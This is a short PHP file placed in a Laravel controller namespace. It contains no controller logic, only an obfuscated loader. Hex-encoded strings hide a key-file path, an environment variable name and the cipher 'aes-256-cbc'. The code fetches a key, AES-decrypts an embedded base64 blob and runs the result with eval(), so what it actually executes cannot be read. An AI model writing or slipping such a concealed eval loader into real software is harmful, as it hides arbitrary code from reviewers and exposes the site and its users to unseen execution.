<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('A+Kch+1XtBpriaKT45tVmw==');

$c=base64_decode(

'v5KMJwQRYvsjo7t9XvYZDolZigKoaOqxW+JNCULnF/tk5XFn3wqQTsQq+fVkfR5ONzm9K0PHVfgh' .
'oSvt+B3kc0ws0zq1Z12npqSe9qWAkExth+3JWEMZZsjB92mlfcLraFY97SfMiZC2nM1UVCI2PvQt' .
'uSD0Nn839d+fgS8eQlpleqDqtoP9xFq3M90/Deakr8X+qFz5DHiXNG+k2L2w6uO1hg4cA3UXztuj' .
'0pVJHOohi+u8e5VnleEIk50uCUuQxZeilmPbQe/okiwaoGzLYw=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

